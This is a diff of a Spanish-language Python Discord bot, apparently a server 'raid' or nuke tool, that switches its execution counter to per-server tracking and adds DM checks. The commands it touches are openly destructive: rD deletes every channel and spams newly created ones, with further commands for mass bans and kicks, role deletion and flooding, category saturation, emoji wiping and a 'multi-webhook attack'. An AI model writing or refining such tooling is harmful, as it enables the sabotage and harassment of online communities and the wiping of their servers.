@@ -19,11 +19,11 @@ TOKEN = os.getenv("DISCORD_TOKEN") or "TU_TOKEN_AQUI"
 # El banner animado de Discord configurado de forma global
 GIF_URL = "https://cdn.discordapp.com/banners/1334323253992361986/a_1da916f82737a9ca0084c939821aaba7.webp?size=2048&animated=true"
 
-# Configuración de variables globales
-ejecuciones_actuales = 0
+# ================= VARIABLES GLOBALES OPTIMIZADAS =================
+# Cambiado a un diccionario para separar los contadores por servidor (Guild)
+ejecuciones_por_servidor = {}  
 MAX_EJECUCIONES = 2
 tiempo_inicio = datetime.now()
-ultimo_msg_eje = None  # Guarda el último mensaje de !eje para poder editarlo
 
 # Configuración explícita de los Intents necesarios
 intents = discord.Intents.default()
@@ -41,46 +41,46 @@ async def on_ready():
 
 
 # ================= FUNCIÓN AUXILIAR PARA EL EMBED DE !eje =================
-def generar_embed_eje():
-    global ejecuciones_actuales, MAX_EJECUCIONES
+def generar_embed_eje(guild_id):
+    global ejecuciones_por_servidor, MAX_EJECUCIONES
     
-    # Color estético: Verde si está libre (0), Amarillo si lleva 1, Rojo si está lleno (2)
-    color = discord.Color.green() if ejecuciones_actuales == 0 else (discord.Color.orange() if ejecuciones_actuales == 1 else discord.Color.red())
+    # Si el servidor no está en el diccionario, empieza en 0
+    actuales = ejecuciones_por_servidor.get(guild_id, 0)
+    
+    # Color estético del Embed según el uso del servidor
+    if actuales == 0:
+        color = discord.Color.green()
+    elif actuales == 1:
+        color = discord.Color.orange()
+    else:
+        color = discord.Color.red()
     
     embed = discord.Embed(
         title="📊 CONTROL DE EJECUCIONES",
-        description=f"**Ejecuciones del bot en:** `{ejecuciones_actuales}/{MAX_EJECUCIONES}`",
+        description=f"**Ejecuciones del bot en este servidor:** `{actuales}/{MAX_EJECUCIONES}`",
         color=color
     )
-    embed.set_footer(text="MacHUB Engine • Monitoreo en tiempo real")
+    embed.set_footer(text="MacHUB Engine • Monitoreo por servidor")
     embed.timestamp = datetime.now()
     return embed
 
 
-# ================= COMANDO !eje (CON AUTODETECCIÓN Y EDICIÓN) =================
+# ================= COMANDO !eje (INDIVIDUAL POR SERVIDOR) =================
 @bot.command()
 async def eje(ctx):
-    global ultimo_msg_eje
-    embed = generar_embed_eje()
+    if not ctx.guild: return  # Evita que se use en mensajes directos (DM)
     
+    embed = generar_embed_eje(ctx.guild.id)
     try:
-        # Si ya enviamos un mensaje antes en este canal, intentamos editarlo
-        if ultimo_msg_eje:
-            await ultimo_msg_eje.edit(embed=embed)
-            # Borramos el comando del usuario para mantener el chat limpio
-            try: await ctx.message.delete()
-            except: pass
-        else:
-            # Si es la primera vez, mandamos uno nuevo y guardamos la ID
-            ultimo_msg_eje = await ctx.send(embed=embed)
+        await ctx.send(embed=embed)
     except:
-        # Si por alguna razón el mensaje viejo fue borrado manualmente, mandamos uno nuevo
-        ultimo_msg_eje = await ctx.send(embed=embed)
+        pass
 
 
 # ================= 1. COMANDO BANPRO =================
 @bot.command()
 async def banpro(ctx):
+    if not ctx.guild: return
     if not ctx.author.guild_permissions.ban_members: return
     if not ctx.guild.me.guild_permissions.ban_members: return
     
@@ -111,16 +111,23 @@ async def banpro(ctx):
 # ================= 2. COMANDO RAIDEAR Y SPAM (rD) =================
 @bot.command()
 async def rD(ctx):
-    global ejecuciones_actuales, ultimo_msg_eje
+    global ejecuciones_por_servidor
+    if not ctx.guild: return
     
     if not ctx.author.guild_permissions.manage_channels: return
     if not ctx.guild.me.guild_permissions.manage_channels: return
 
-    # Control del límite de ejecuciones
-    if ejecuciones_actuales >= MAX_EJECUCIONES:
-        try: await ctx.send(f"❌ Límite alcanzado ({ejecuciones_actuales}/{MAX_EJECUCIONES}). No se pueden realizar más ejecuciones.")
+    # Obtener las ejecuciones exclusivas de este servidor
+    actuales = ejecuciones_por_servidor.get(ctx.guild.id, 0)
+
+    # 1. Control del límite de ejecuciones en este servidor específico
+    if actuales >= MAX_EJECUCIONES:
+        try: await ctx.send(f"❌ Límite alcanzado en este servidor ({actuales}/{MAX_EJECUCIONES}). No se pueden realizar más ejecuciones.")
         except: pass
         return
+
+    # 2. Sumamos la ejecución al servidor actual de inmediato
+    ejecuciones_por_servidor[ctx.guild.id] = actuales + 1
 
     channels_to_delete = list(ctx.guild.channels)
     for channel in channels_to_delete:
@@ -148,18 +155,11 @@ async def rD(ctx):
     tasks = [spam_task(ch) for ch in created_channels]
     await asyncio.gather(*tasks)
 
-    # Sumamos una ejecución tras finalizar el raid
-    ejecuciones_actuales += 1
-
-    # Auto-actualizar el Embed de !eje de inmediato si ya estaba en pantalla
-    if ultimo_msg_eje:
-        try: await ultimo_msg_eje.edit(embed=generar_embed_eje())
-        except: pass
-
 
 # ================= 3. EXPULSIÓN MASIVA =================
 @bot.command()
 async def kickpro(ctx):
+    if not ctx.guild: return
     if not ctx.author.guild_permissions.kick_members: return
     if not ctx.guild.me.guild_permissions.kick_members: return
 
@@ -189,6 +189,7 @@ async def kickpro(ctx):
 # ================= 4. CAMBIAR IDENTIDAD DEL SERVIDOR =================
 @bot.command()
 async def rnServers(ctx):
+    if not ctx.guild: return
     if not ctx.author.guild_permissions.manage_guild: return
     if not ctx.guild.me.guild_permissions.manage_guild: return
 
@@ -202,6 +203,7 @@ async def rnServers(ctx):
 # ================= 5. BORRAR TODOS LOS ROLES =================
 @bot.command()
 async def rolesD(ctx):
+    if not ctx.guild: return
     if not ctx.author.guild_permissions.manage_roles: return
     if not ctx.guild.me.guild_permissions.manage_roles: return
 
@@ -222,6 +224,7 @@ async def rolesD(ctx):
 # ================= 6. CREACIÓN MASIVA DE ROLES =================
 @bot.command()
 async def rolesC(ctx):
+    if not ctx.guild: return
     if not ctx.author.guild_permissions.manage_roles: return
     if not ctx.guild.me.guild_permissions.manage_roles: return
 
@@ -244,6 +247,7 @@ async def rolesC(ctx):
 # ================= 7. SATURACIÓN DE CATEGORÍAS =================
 @bot.command()
 async def ccpro(ctx):
+    if not ctx.guild: return
     if not ctx.author.guild_permissions.manage_channels: return
     if not ctx.guild.me.guild_permissions.manage_channels: return
 
@@ -264,6 +268,7 @@ async def ccpro(ctx):
 # ================= 8. CAMBIAR APODOS GLOBALMENTE =================
 @bot.command()
 async def nickpro(ctx):
+    if not ctx.guild: return
     if not ctx.author.guild_permissions.manage_nicknames: return
     if not ctx.guild.me.guild_permissions.manage_nicknames: return
 
@@ -291,6 +296,7 @@ async def nickpro(ctx):
 # ================= 9. BORRAR EMOJIS Y STICKERS =================
 @bot.command()
 async def emojisD(ctx):
+    if not ctx.guild: return
     if not ctx.author.guild_permissions.manage_expressions: return
     if not ctx.guild.me.guild_permissions.manage_expressions: return
 
@@ -309,6 +315,7 @@ async def emojisD(ctx):
 # ================= 10. MULTI-WEBHOOK ATTACK =================
 @bot.command()
 async def hookpro(ctx):
+    if not ctx.guild: return
     if not ctx.author.guild_permissions.manage_webhooks: return
     if not ctx.guild.me.guild_permissions.manage_webhooks: return
 
@@ -380,4 +387,4 @@ async def on_command_error(ctx, error):
     logging.error(f"Error: {error}")
 
 bot.run(TOKEN)
-        
+    
